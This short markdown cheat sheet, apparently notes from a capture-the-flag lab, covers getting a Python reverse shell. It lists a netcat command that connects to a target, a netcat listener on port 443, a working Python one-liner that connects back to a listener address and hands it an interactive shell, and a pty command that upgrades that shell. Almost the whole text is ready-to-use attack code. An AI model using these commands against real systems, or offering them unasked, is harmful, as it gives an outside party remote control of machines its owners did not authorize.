## Python

### Ip: 
```nc 10.10.194.240 8000```

### Listener : 

```sudo nc -lvnp 443```

### Python Reverse Shell :

```import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.21.128.251",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")```

### Improve the shell: 

```python3 -c 'import pty; pty.spawn("/bin/bash")'```
